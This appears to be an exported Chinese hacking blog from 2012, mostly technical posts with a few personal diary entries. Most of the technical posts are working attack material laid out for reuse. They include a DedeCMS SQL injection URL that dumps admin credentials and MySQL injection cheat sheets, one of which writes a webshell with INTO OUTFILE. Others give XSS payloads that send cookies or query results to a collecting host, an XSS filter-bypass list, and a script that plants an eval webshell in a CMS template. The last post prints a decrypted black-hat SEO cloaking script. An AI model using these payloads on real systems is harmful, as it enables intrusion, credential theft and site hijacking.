    <content type="text"><![CDATA[&nbsp; &nbsp; &nbsp; 到小组第一次做汇报，开始把我纠结了很久，不知道讲什么，四处求助，开始说有大一的嫩娃娃们要听，我觉得讲些基础的东西比较好，比如什么注入和xss之类入门的东西，但是他们又说这次不用管大一的嫩娃娃们，我们自己平时怎么讲的就怎么讲，这个更纠结我了，想了很多东西，总感觉有点不合适，如果你讲的东西没有自己的见解并且都是大家知道的，就没有什么意义了，于是乎我左思右想，就想到了最近的dedecms注入，注入出来的时候我就去看了具体的代码，也简单分析了一下，结合我以前看过dedecms的经验，也发现了很多有意思的东西。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;还记得在今年6月份吧！晴天小涛在90sec发了来一帖子，是关于dedecms全局变量再次覆盖的问题，当时我也去看了下dedecms的这个漏洞的具体代码，也做了一些分析，见：http://lanu.sinaapp.com/0day/100.html&nbsp;当时只是在关于为什么会再次发生全局变量覆盖这个问题上做了分析，没有去关心其他的东西了，这篇文章我也在90sec上发了，当时晴天小涛回复说，哪儿还有个二次变量覆盖问题，有时间我们还可以继续分析下，当时忙着考试吧，快放假了，做学生的当时都很忙，就没有再去分析了。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;正好现在出了这个sql注入就是和我们当时说的那个二次变量覆盖有关系，我也有时间，所以就去具体看来下，分析了下！就做为小组汇报的题材了！虽然这个分析在90sec上花开若相惜也做了分析。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 前面全是废话，下面走入正题！ ==================================================== &nbsp; &nbsp; 我们先从去年的dedecms的全局变量覆盖说起，不清楚的观众可以看下安全宝出的分析报告：http://netsecurity.51cto.com/art/201108/286898.htm&nbsp;，而现在我们的注入文件/plus/feedback.php 中 &nbsp; require_once(dirname(__FILE__)."/../include/common.inc.php"); if($cfg_feedback_forbid==’Y’) exit(’系统已经禁止评论功能！’); require_once(DEDEINC."/filter.inc.php");&nbsp; &nbsp; 可以看出上边包含有两个文件我们先看 &nbsp; /include/common.inc.php function _RunMagicQuotes(&amp;$svar) { if(!get_magic_quotes_gpc()) { if( is_array($svar) ) { foreach($svar as $_k =&gt; $_v) $svar[$_k] = _RunMagicQuotes($_v); } else { if( strlen($svar)&gt;0 &amp;&amp; preg_match(’#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#’,$svar) ) { exit(’Request var not allow!’); } $svar = addslashes($svar); } } return $svar; } if (!defined(’DEDEREQUEST’)) { //检查和注册外部提交的变量 (2011.8.10 修改登录时相关过滤) function CheckRequest(&amp;$val) { if (is_array($val)) { foreach ($val as $_k=&gt;$_v) { if($_k == ’nvarname’) continue; CheckRequest($_k); CheckRequest($val[$_k]); } } else { if( strlen($val)&gt;0 &amp;&amp; preg_match(’#^(cfg_|GLOBALS|_GET|_POST|_COOKIE)#’,$val) ) { exit(’Request var not allow!’); } } } //var_dump($_REQUEST);exit; CheckRequest($_REQUEST); foreach(Array(’_GET’,’_POST’,’_COOKIE’) as $_request) { foreach($$_request as $_k =&gt; $_v) { if($_k == ’nvarname’) ${$_k} = $_v; else ${$_k} = _RunMagicQuotes($_v); } } } &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;在这段代码中_RunMagicQuotes()函数是用来转义的，如果php自带的gpc没有开启，就是用他转义。 然后接下来的代码就是初始化变量了，这儿初始化变量是对带入的值做了转义的，如$_GET[test]=111’ &nbsp;就会成为$test=111’ 这样的形式。 &nbsp; &nbsp; 接下来我们再看 /plus/filter.inc.php ,这个文件主要是过滤脏话的，就是说，你说的脏话全部会被替换成&amp;#42&amp;#42&amp;#42，在代码里边的脏话替换函数是_FilterAll(), &nbsp; &nbsp; 他这个文件再次对变量进行了初始化： &nbsp; /&#42 对_GET,_POST,_COOKIE进行过滤 &#42/ foreach(Array(’_GET’,’_POST’,’_COOKIE’) as $_request) { foreach($$_request as $_k =&gt; $_v) { ${$_k} = _FilterAll($_k,$_v); } } &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看见了，这儿变量二次初始的时候只用了_FilterAll() 进行过滤，如果php自带的gpc是关闭的时候，上边common.inc.php进行的变量初始化时的$test=111’，这儿再进行变量初始化则得到$test=111’ 由于在feedback.php 文件中我们可以看出，filter.inc.php文件里面的变量初始化会在common.inc.php之后，所以$test=111’会覆盖$test=111’ 使得前面的转义失效了，最终$test=111’。 &nbsp; &nbsp; &nbsp; 这就是我们能够注入的根源所在，再加上feedback中的$typeid初始化过后，就没有再次过滤了，所以我们就可以使用他注入了。 &nbsp; exp: from：90sec 鬼哥 http://127.0.0.1//plus/feedback.php?validate=swep&amp;action=send&amp;comtype=comments&amp;fid=1&amp;aid=1&amp;isconfirm=yes&amp;msg=90sec&amp;typeid=0’,’3’,’4’,’5’,’0’,’1351739660’,’0’,’0’,’0’,’0’,’0’,’aaaaaa’),(’1’,’2’,@`’`,’4’,’5’,’1’,’1351739660’, ’0’,’0’,’0’,’0’,’0’,(SELECT concat(uname,0x5f,pwd,0x5f) FROM `%23@__admin`))%23 &nbsp; 接下来我们做下思维延伸： 1.懂的了原理我们就可以继续再去审计下dedecms的代码了，我们可以仔细的看下，包含有filter.inc.php的文件，说不定你也能挖出几个洞来！ &nbsp; 2.在filter.inc.php中有一个脏话替换函数，会把脏话替换成&amp;#42&amp;#42&amp;#42, 如果我们传如的参数里面有这样的一个字符 /他妈/ 他就会成为/&amp;#42&amp;#42&amp;#42/,我相信大家已经想到了什么。 &nbsp; 3.程序员不好当啊！ &nbsp; &nbsp; &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>变量覆盖</tag>
        <tag>dedecms</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[过正常的我想过的生活]]></title>
    <url>%2F2012%2F11%2F11%2F%E8%BF%87%E6%AD%A3%E5%B8%B8%E7%9A%84%E6%88%91%E6%83%B3%E8%BF%87%E7%9A%84%E7%94%9F%E6%B4%BB%2F</url>
    <content type="text"><![CDATA[正常的我的生活: &nbsp;&nbsp;&nbsp;&nbsp;7：00 起床跑步 &nbsp; &nbsp; 7：30 洗漱 &nbsp; &nbsp; 8：00 吃早饭 &nbsp; &nbsp; 按时上课，无特殊情况不逃课 &nbsp; &nbsp; 12：00 吃午饭 &nbsp; &nbsp; 下午有时间就打球（一周至少一次） &nbsp; &nbsp; 18：00 吃晚饭 &nbsp;&nbsp;&nbsp;&nbsp;22：20 回寝室 &nbsp; &nbsp; 23：00 上床看书 &nbsp; &nbsp; 熄灯睡觉 &nbsp; 学习课程： &nbsp; &nbsp; 高等数学1 &nbsp; &nbsp; 线性代数A &nbsp; &nbsp; 数据结构 &nbsp; &nbsp; 数据库（sqlserver 2008） &nbsp; &nbsp; Java程序设计 &nbsp; &nbsp; 信安数学 &nbsp; &nbsp; python程序设计 &nbsp; 业余工作： &nbsp; &nbsp; 下午或晚上]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[写在今天]]></title>
    <url>%2F2012%2F10%2F27%2F%E5%86%99%E5%9C%A8%E4%BB%8A%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 不知道怎么说了！时间到了今天，还有什么说的呢？建博客1年多了吧！想想初衷，好像是为了学习东西，记录我学过的东西，证明我没有偷懒，有学就有写！但是似乎和初衷有了很大的区别，有很多为了掩饰自己的无知而没有写进去的，到头来我真的无知了。 &nbsp; &nbsp; 不谈遥远的过去，就谈当下吧！ &nbsp; &nbsp; 当下的我，走进了我爱好的世界； &nbsp; &nbsp; 当下的我，开始我新的人生； &nbsp; &nbsp; 当下我的，有了太多的顾虑； &nbsp; &nbsp; 当下的我，对未来更加的迷茫； &nbsp; &nbsp; 当下的我，还记得以前的我吗； &nbsp; &nbsp; 当下的我，依旧是我； &nbsp; &nbsp; 当下的我，???????? &nbsp; &nbsp; 我不知道当下的我是否是正确的我，但我却知道当下的我是我喜欢的我。 &nbsp;&nbsp;&nbsp;&nbsp;博客依旧，人也依旧，变的是心，变的是物。 &nbsp; &nbsp; 上个月这个月还真没研究什么东西，无自己见解的博文，不是自己的博文。 &nbsp; &nbsp; 写在当下，活在当下，面朝大海，春暖花开。 &nbsp;&nbsp;]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>心情</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于mysql报错注入的几个语句【记录】]]></title>
    <url>%2F2012%2F09%2F16%2F%E5%85%B3%E4%BA%8Emysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E4%B8%AA%E8%AF%AD%E5%8F%A5%E3%80%90%E8%AE%B0%E5%BD%95%E3%80%91%2F</url>
    <content type="text"><![CDATA[报错注入，报user表中的字段:select &amp;#42 from (select &amp;#42 from user a join user b) c; select &amp;#42 from (select &amp;#42 from user a join user b using (host,user)) c;报错注入select 1 from (select count(&amp;#42),concat(version(),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a;select 1 from (select count(&amp;#42),concat((select table_name from information_schema.tables limit 1,1),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>mysql报错注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用xss 执行sql注入]]></title>
    <url>%2F2012%2F08%2F03%2F%E5%88%A9%E7%94%A8xss-%E6%89%A7%E8%A1%8Csql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很多其他的用法！但是，这个注入我没有找到phpcms v9.1.15测试，其他版本都没有测试成功！ 于是乎我只有假想下一个极端环境： 1.前台有且只有一个xss漏洞（不能获取管理员cookie） 2.后台有且只有一个sql注入漏洞（注入漏洞文件只有管理员可以访问） 3.注入获得管理员密码可解密 4.除以上无其他任何漏洞（包括后台getwebshell） 其实我就是想说，我们只可以利用这个xss执行注入！ &nbsp; 模拟注入漏洞代码 sqli.php &lt;?php @error_reporting (E_ALL &amp; ~E_NOTICE &amp; ~E_WARNING);//错误忽略 $con = mysql_connect("localhost","root",""); if(!$con) {die(’Could not connect: ’ . mysql_error());} mysql_select_db("test",$con); $id = $_GET[’xss’]; $sql = "select id,realname from test where id="."$id"; $view = mysql_query($sql); $row = mysql_fetch_array($view); echo $row[id]."&lt;br /&gt;"; echo $row[realname]."&lt;br /&gt;"; ?&gt; &nbsp; mysql数据库： database：test table：test、admin column：test.id、test.realname admin.id、admin.username、admin.password &nbsp; get.php（获取的注入后数据截取） &lt;?php $file = fopen("data.txt","a"); fwrite($file,$_GET[’get’]); fclose($file); ?&gt; &nbsp; xsssqli.js（payload） function addLoadEvent(func)//窗口打开加载多个函数 { var oldfunc=window.onload; //页面打开是加载方法 if(typeof(window.onload)!="function") { window.onload=func; } else { window.onload=function() { oldfunc(); func(); } } } function get_xsssqli() { var url = "http://127.0.0.1/xss/sqli.php?xss=1%20and%201=2%20union%20select%20username,password%20from%20admin"; var ajax = null; if(window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if(window.ActiveXObject) { ajax = new ActiveXObject("Microsoft.XMLHTTP");//ie6和一下老版本 } else { return; } ajax.open("GET", url, true); ajax.send(null); ajax.onreadystatechange = function() { if(ajax.readyState == 4 &amp;&amp; ajax.status == 200) { var img = document.createElement("img"); img.src = "http://127.0.0.1/xss/get.php?get="+ajax.responseText; document.body.appendChild(img); } } } addLoadEvent(get_xsssqli); &nbsp; 模拟xss漏洞 &lt;html&gt; &lt;head&gt; &lt;title&gt;use xss to sqli&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src=http://127.0.0.1/xss/get.js &gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &nbsp; 最后成功得到数据: 当然你也可以写个正则截获指定数据！ 转载请指明出处：L.N.博客&nbsp; http://lanu.sinaapp.com/htmlcssjisxml/112.html]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【转】细谈Web系统安装程序安全]]></title>
    <url>%2F2012%2F08%2F01%2F%E3%80%90%E8%BD%AC%E3%80%91%E7%BB%86%E8%B0%88Web%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; 写的很不错！对代码审计帮助很大！值得分享！]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[订阅博客]]></title>
    <url>%2F2012%2F07%2F31%2F%E8%AE%A2%E9%98%85%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[xss payload]]></title>
    <url>%2F2012%2F07%2F29%2Fxss-payload%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;xss payload可以使用富客户端文本书写，大多数用javascript，少部分用actionscript等等。 &nbsp; 1.盗取cookie，发起cookie劫持 使用xss漏洞插入cookie.js cookie.js代码： &nbsp; var img = document.createElement("img"); img.src = "http://lanu.sinaapp.com/cookie.php?cookie="+escape(document.cookie); document.body.appendChild(img); &nbsp; cookie.php代码 &nbsp; &lt;?php $file = fopen("cookie.txt","a"); fwrite($file,$_GET[’cookie’]); fclose($file); ?&gt; &nbsp; 2.构造GET和POST请求 get.js代码： &nbsp; var img = document.createElement("img"); img.src = "一个可以使用的get请求链接"; document.body.appendChild(img); &nbsp; post.js代码： 代码1：(DOM节点方式) &nbsp; var f = document.createElement("form"); f.action =""; f.method = "post"; document.body.appendChild(f); var i1 = document.createElement("input"); i1.name = "xxx"; i1.value = "xxxx"; f.appendChild(i1); var i2 = document.createElement("input"); i2.name = "aaa"; i2.value = "aaa"; f.appendChild(i2); f.submit(); &nbsp; 代码2： &nbsp; var dd = document.createElement("div"); document.body.appendChild(dd); dd.innerHTML =’&lt;form action="" method="post" id="xssform" name="mbform"&gt;’+’&lt;input type="hidden" value="xxxx" name="xxx" /&gt;’+’&lt;input type="text" value="aaaa" name="aaa" /&gt;’+’&lt;/form&gt;’; document.getElementById("xssform").submit(); &nbsp; 代码3：(使用XMLHttpRequest) &nbsp; var url = "http://lanu.sinaapp.com"; var postStr = "aaa=aaaa&amp;xxx=xxxx"; var ajax = null; if(window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if(window.ActiveXObject) { ajax = new ActiveXObject("Microsoft.XMLHTTP");//ie6和一下老版本 } else { return; } ajax.open("POST", url , true); ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); ajax.send(postStr); //ajax.open("GET", url, true); //ajax.send(null); ajax.onreadystatechange = function() { if(ajax.readyState == 4 &amp;&amp; ajax.status == 200) { //alert("Done!"); } } 3.xss钓鱼 4.浏览器识别和用户安装软件识别 http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/ 5.css history hack http://ha.ckers.org/weird/CSS-history-hack.html &nbsp; 读《白帽子讲web安全》笔记 xxs payload getshell 实例： 骑士cms getshell &nbsp; //构造好的能写入一句话的连接 var Shelldata=’tpl_content=%3C%3Fphp%20eval%28%24_POST%5Bxdxd%5D%29%3F%3E&amp;tpl_dir=default&amp;tpl_name=footer.php&amp;del_Submit=%B1%A3%B4%E6’; try { //调用XMLHttpRequest var xml = window.XMLHttpRequest ? (new XMLHttpRequest()) : (new ActiveXObject(’Microsoft.XMLHTTP’)); xml.open("POST",’admin_templates.php?act=do_edit’,false); xml.setRequestHeader(’Content-Type’, ’application/x-www-form-urlencoded’); xml.onreadystatechange = function() { if(xml.readyState == 4) { } } xml.send(Shelldata); } catch(e) { }]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>xss payload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS 笔记]]></title>
    <url>%2F2012%2F07%2F29%2FXSS-%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[基础: &nbsp; “&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt; &nbsp; 绕过&lt;script&gt; 标签过滤: &nbsp; %253cscript%253ealert(document.cookie)%253c/script%253e &nbsp; “&gt;&lt;s”%2b”cript&gt;alert(document.cookie)&lt;/script&gt; &nbsp; “&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/script&gt; &nbsp; “&gt;&lt;&lt;script&gt;alert(document.cookie);//&lt;&lt;/script&gt; &nbsp; foo%00&lt;script&gt;alert(document.cookie)&lt;/script&gt; &nbsp; &lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;/script&gt;ipt&gt; &nbsp; %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E &nbsp; 在&lt;script&gt;里: &nbsp; ’; alert(document.cookie); var foo=’ &nbsp; foo’; alert(document.cookie);//’; &nbsp; &lt;/script&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt; &nbsp; 无&lt;script&gt;的xxs: &nbsp; &lt;img src=asdf onerror=alert(document.cookie)&gt; &nbsp; &lt;BODY ONLOAD=alert(’XSS’)&gt; &nbsp; 在ie上可以接受一个样式属性: &nbsp; http://www.site.com?image=s%22%20style=x:expression(alert(document.cookie)) &nbsp; http://www.site.com?image=s%22%20style=%22background:url(javascript:alert(’XSS’)) &nbsp; http://www.site.com?image=s%22%20%22+STYLE%3D%22background-image%3A+expression%28alert%28%27XSS%3F%29%29 &nbsp; 在 FF&nbsp;假如你可以控制 refresh me标签, 你可以用url注入用javascript: : &nbsp; http://www.site.com?catCode=%22/%3E%3Cmeta%20http-equiv=refresh%20content=0;javascript:alert(document.cookie);&gt; &nbsp; xss笔记网站：http://ha.ckers.org/xss.html]]></content>
      <categories>
        <category>HTML|CSS|JS|xss|xml</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【复习】mysql注入总结]]></title>
    <url>%2F2012%2F07%2F26%2F%E3%80%90%E5%A4%8D%E4%B9%A0%E3%80%91mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;最近不知怎么的！好像是很久不做渗透测试了！很多东西都忘了！简单的注入语句都想不起来！于是我想啊，有必要总结一下了，复习一下了！以前太懒不更新博客，记录东西，现在想复习翻以前的东西，什么都没有！汗啊！ —————————–以上全是废话——————– 标题：mysql注入总结 作者：L.N. 时间：2012-07-23 博客：lanu.sinaapp.com &nbsp; 目录： 0x00 mysql一般注入（select） 0x01 mysql一般注入（insert、update） 0x02 mysql报错注入 0x03 mysql一般盲注 0x04 mysql时间盲注 0x05&nbsp;mysql其他注入技巧 0x06 mysql数据库版本特性&nbsp; 0x07 声明 &nbsp; 正文： &nbsp; 0x00 mysql一般注入（select） &nbsp; 1.注释符 # /&amp;#42 – &nbsp; 2.过滤空格注入 使用/&amp;#42&amp;#42/或()或+代替空格 %0c = form feed, new page %09 = horizontal tab %0d = carriage return %0a = line feed, new line &nbsp; 3.多条数据显示 concat() group_concat() concat_ws() &nbsp; 4.相关函数 system_user() 系统用户名 user() 用户名 current_user 当前用户名 session_user()连接数据库的用户名 database() 数据库名 version() MYSQL数据库版本 load_file() MYSQL读取本地文件的函数 @@datadir 读取数据库路径 @@basedir MYSQL 安装路径 @@version_compile_os 操作系统 Windows Server 2003 GRANT ALL PRIVILEGES ON &amp;#42.&amp;#42 TO [’root’@’%’](mailto:’root’@’%’) IDENTIFIED BY ’123456’ WITH GRANT OPTION; 5.mysql一般注入语句 猜字段数 order by n/&amp;#42 查看mysql基本信息 and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/&amp;#42 查询数据库 and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1/&amp;#42 and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/&amp;#42 查询表名 and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1/&amp;#42 and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/&amp;#42 查询字段 and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1/&amp;#42 and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/&amp;#42 查询数据 and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/&amp;#42 判断是否具有读写权限 and (select count(&amp;#42) from mysql.user)&gt;0/&amp;#42 and (select count(file_priv) from mysql.user)&gt;0/&amp;#42 &nbsp; 6.mysql读取写入文件 必备条件： 读：file权限必备 写：1.绝对路径 2.union使用&nbsp;3. 可以使用’’&nbsp;&nbsp; ————————-读———————-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mysql3.x读取方法 create table a(cmd text); load data infile ’c:\xxx\xxx\xxx.txt’ into table a; select &amp;#42 from a; mysql4.x读取方法 除上述方法还可以使用load_file() create table a(cmd text); insert into a(cmd) values(load_file(’c:\ddd\ddd\ddd.txt’)); select &amp;#42 from a; mysql5.x读取方法 上述两种都可以 读取文件技巧： load_file(char(32,26,56,66)) load_file(0x633A5C626F6F742E696E69) ————写————————– into outfile写文件 union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ’d:web90team.php’/&amp;#42 union select 1,2,3,load_file(’d:weblogo123.jpg’),5,6,7,8,9,10,7 into outfile ’d:web90team.php’/&amp;#42 &nbsp; 0x01 mysql一般注入（insert、update） &nbsp; mysql一般请求mysql_query不支持多语句执行，mysqli可以。&nbsp; &nbsp; insert注入多使用报错注入！ 1.如果可以直接插入管理员可以直接使用！ insert into user(username,password) values(’xxxx’,’ xxxx’),(’dddd’,’dddd’)/&amp;#42 ’); 2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell &nbsp; update注入同上 &nbsp; 0x02 mysql报错注入 &nbsp; 1. and(select 1 from(select count(&amp;#42),concat((select (select (语句)) from information_schema.tables limit 0,1),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a) and 1=1 语句处填入一般一句，如：SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1 &nbsp; 2. and+1=(select+&amp;#42+from+(select+NAME_CONST((语句),1),NAME_CONST((语句),1))+as+x)– &nbsp; 3.update web_ids set host=’www.0x50sec.org’ where id =1 aNd (SELECT 1 FROM (select count(&amp;#42),concat(floor(rand(0)&amp;#422),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b); &nbsp; 4.insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(&amp;#42),concat(floor(rand(0)&amp;#422),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b))); &nbsp; &nbsp;0x03 mysql一般盲注 &nbsp; 使用ascii AND&nbsp;ascii(substring((SELECT&nbsp;password&nbsp;FROM&nbsp;users where&nbsp;id=1),1,1))=49 使用正则表达式 and 1=(SELECT 1 FROM information_schema.tables&nbsp; WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ’^[a-n]’ LIMIT 0,1) &nbsp; 0x04 mysql时间盲注 &nbsp; 1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(’msg’,’by 5 seconds’)),null) from (select database() as current) as tbl &nbsp; UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’ &nbsp; &nbsp; 0x05 mysql其他注入技巧 &nbsp; 以后遇见了更新 &nbsp; 0x06 mysql数据库版本特性 &nbsp; 1. mysql5.0以后&nbsp; information.schema库出现 2. mysql5.1以后 udf 导入xxlibplugin 目录下 3.mysql5.x以后 system执行命令 &nbsp; 0x07 声明&nbsp; &nbsp; 如有错误，希望指正 如果遗漏，希望讨论 小菜总结，大牛勿吐 记录笔记，时常复习]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>mysql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于一个做流量的代码分析]]></title>
    <url>%2F2012%2F07%2F21%2F%E5%85%B3%E4%BA%8E%E4%B8%80%E4%B8%AA%E5%81%9A%E6%B5%81%E9%87%8F%E7%9A%84%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;其实这个我也不是很懂！关于怎么做流量！在此之前都没有接触过！前几天有个人找我解密一段加密代码，要我帮他重新写一下！ &nbsp;&nbsp;&nbsp;&nbsp;在我对代码分析过后才懂了一些，什么叫做做流量！呵呵！原始的加密代码我就不贴了！他的加密方式不是很复杂！但是解密也是一个累人的活！他把变量名都用的很长的随机字符，变量值都是用base64加密过的！ 主要是解密过后的: &lt;? error_reporting (E_ERROR); $aaiak = $_SERVER[’HTTP_USER_AGENT’]; $ecdef = $_SERVER[’REMOTE_ADDR’]; $ohkic = $_SERVER[’HTTP_REFERER’]; $nhamo = $_SERVER[’HTTP_HOST’]; $mcnad = $_SERVER[’REQUEST_URI’];//这句以前的代码都是获取一些相关数据 $ghoif = ’www.xxxxx.com’; $cikhc = "/client/{var}/index.php"; $jjaja = "/client/{var}/index.txt"; $kabne = array("yh" =&gt; ’%D3%C0%BA%E3|%E6%B0%B8%E6%81%92|aion’,"jx" =&gt; ’%BD%A3|%E5%89%91’,"my" =&gt; ’%C4%A7%D3%F2|%E9%AD%94%E5%9F%9F’,"jy" =&gt; ’%BE%C5%D2%F5|%E4%B9%9D%E9%98%B4’); $cdfhe = array(’’,’/’,’/index.php’); $omccd = array(’Maxthon’,’Firefox’); $echha = array(’125.90.93.’,’127.0.0.’,’192.168.1.’); $afhbj = array(’baidu’,’google’,’soso’,’sogou’,’yahoo’,’bing’,’youdao’); $heeni = array(’site%3A’,’inurl%3A’); $gccik = array_keys($_GET); $cnfbe = array_keys($kabne); $onbla = ’x64’; $emfii = explode(’.’,$nhamo);//把前面获取的主机ip以点为标识分割为数组 $mejgm = count($emfii);//这句以前都是一些变量和数组的定义 if($mejgm &gt; 2) { $nhamo = $emfii[$mejgm-3].’.’.$emfii[$mejgm-2].’.’.$emfii[$mejgm-1]; }//上边的这个是取主机ip的后3位。 $blafk = $ilnhj = $cdbn = false; foreach($kabne as $bblie =&gt; $odjhd) { $mik = explode(’|’,$odjhd); //上边是遍历$kabne数组，这个和服务端的读取目录有关 foreach($mik as $hoelc) { if(stristr($ohkic,$hoelc)) { $cdbn = $bblie; $ilnhj = true; break; } }//上边是和关键字的匹配 if(in_array($bblie,$gccik)) { $cdbn = $bblie; $ilnhj = true; } if($ilnhj) { break; } } foreach($heeni as $behgc) { if(stristr($ohkic,$behgc)) { $ilnhj = false; break; } } foreach($omccd as $ibkmo) { if(stristr($aaiak,$ibkmo)) { $ilnhj = false; break; } } foreach($afhbj as $ljild) { if(stristr($aaiak,$ljild)) { $blafk = true; break; } } foreach($echha as $glekm) { if(stristr($ecdef,$glekm)) { $ilnhj = false; $blafk = false; break; } }//上边的就是一长串的判断匹配 if($blafk &amp;&amp; (!in_array($mcnad,$cdfhe))) { if(!$cdbn) { $cdbn = $cnfbe[array_rand($cnfbe)]; } header("content-Type: text/html; charset=gb2312"); $cbekb = file_get_contents (’http://’ .$ghoif.str_replace(’{var}’,$cdbn,$cikhc).’?d=’.’&amp;r=’.bin2hex($mcnad)); $komac = explode(’[0xSpider]’,$cbekb); echo $komac[1]; exit; } //输出 elseif($ilnhj &amp;&amp; $cdbn &amp;&amp; empty($_COOKIE[$onbla])) { setcookie($onbla,$nhamo,time() + 259200); $cbekb = file_get_contents (’http://’ .$ghoif.str_replace(’{var}’,$cdbn,$jjaja)); header(’Location: ’.base64_decode(str_rot13($cbekb)).’#’.str_replace(’.’,’_’,$nhamo)); exit;//跳转 } ?&gt; &nbsp;下面我画了图！第一次画！我都不知道我画的什么。。。汗 他的做流量分为客服端和服务端，先说下他们的作用 客户端主要是主要是收集信息，比如关键字，ip等 服务端主要是储蓄数据，方便你修改！ 当客服端通过一系列的判断，发现应该使用服务端的那些数据，然后就读取服务端的数据！ 当你的网站被插入了上边的客户端代码，当搜索引擎抓取你的网站的时候，就会抓取到被插入的关键字，当然你用搜索引擎收东西的时候都会被收到。 比如site:www.ddd.com 梦幻西游 www.ddd.com这个站是pr权重比较高的，但是他更本不是游戏站，是个农业站什么，里面更本没有游戏有关的懂得，但是你会用浏览器搜到这个站的梦幻西游，当你点击的时候也不会进去www.ddd.com这个站，你会直接挑战到他指定的站点！ 也就是他使用了你网站的搜索引擎排名. 以上都为个人理解！这个也是最近才有所了解的！错误的希望指正！ &nbsp; 